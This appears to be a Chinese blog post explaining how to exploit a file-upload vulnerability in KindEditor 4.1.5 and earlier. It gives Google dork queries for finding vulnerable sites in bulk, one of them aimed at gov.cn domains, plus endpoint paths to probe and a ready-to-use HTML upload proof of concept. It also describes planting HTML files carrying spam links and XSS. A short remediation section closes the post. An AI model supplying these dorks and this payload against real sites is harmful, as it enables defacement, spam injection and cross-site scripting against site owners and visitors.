# kindeditor<=4.1.5上传漏洞     	

## 0x00 漏洞描述

漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中

这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add("file","doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2")

 

## 0x01 批量搜索

在google中批量搜索：

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
inurl:/examples/uploadbutton.html

inurl:/php/upload_json.php

inurl:/asp.net/upload_json.ashx

inurl://jsp/upload_json.jsp

inurl://asp/upload_json.asp

inurl:gov.cn/kindeditor/
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

 

 

## 0x02 漏洞问题

根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
/asp/upload_json.asp

/asp.net/upload_json.ashx

/jsp/upload_json.jsp

/php/upload_json.php
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

可目录变量查看是否存在那种脚本上传漏洞:

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
kindeditor/asp/upload_json.asp?dir=file

kindeditor/asp.net/upload_json.ashx?dir=file

kindeditor/jsp/upload_json.jsp?dir=file

kindeditor/php/upload_json.php?dir=file
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

## 0x03 漏洞利用

google搜素一些存在的站点 inurl：kindeditor

1.查看版本信息

http://www.xxx.org/kindeditor//kindeditor.js

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002035491-1363270175.jpg)

 

2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.* 

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
kindeditor/asp/upload_json.asp?dir=file

kindeditor/asp.net/upload_json.ashx?dir=file

kindeditor/jsp/upload_json.jsp?dir=file

kindeditor/php/upload_json.php?dir=file
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

3.如下图可以看出是存在jsp上传点:

http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002035961-1395176285.jpg)

 

 

4.写出下面的构造上传poc,这里需要修改<script>...<script>以及url : 的内容,根据实际情况修改.

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
<html><head>

 

<title>Uploader</title>

 

<script src="http://www.xxx.org/kindeditor//kindeditor.js"></script>

 

<script>

 

KindEditor.ready(function(K) {

 

var uploadbutton = K.uploadbutton({

 

button : K('#uploadButton')[0],

 

fieldName : 'imgFile',

 

url : 'http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file',

 

afterUpload : function(data) {

 

if (data.error === 0) {

 

var url = K.formatUrl(data.url, 'absolute');

 

K('#url').val(url);}

 

},

 

});

 

uploadbutton.fileBox.change(function(e) {

 

uploadbutton.submit();

 

});

 

});

 

</script></head><body>

 

<div class="upload">

 

<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />

 

<input type="button" id="uploadButton" value="Upload" />

 

</div>

 

</body>

 

</html>
```

[![复制代码](https://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

 

5.用浏览器打开,然后开启bupsuit进行拦截发送,可以看到成功上传txt文件

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002036444-985275620.png)

 

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002036934-341782767.jpg)

 

 

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223003244737-312707022.png)

 

6.同时也可以上传.html文件,这里就是攻击者最喜欢上传的文件(里面包含了各种暗页连接地址,如菠菜和其他色情站点链接地址)

 

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002037695-739569212.jpg)

 

 

![img](https://img2018.cnblogs.com/blog/1049983/201902/1049983-20190223002038122-566333856.jpg)

 

## 0x04 漏洞修复

1.直接删除upload_json.*和file_manager_json.*

2.升级kindeditor到最新版本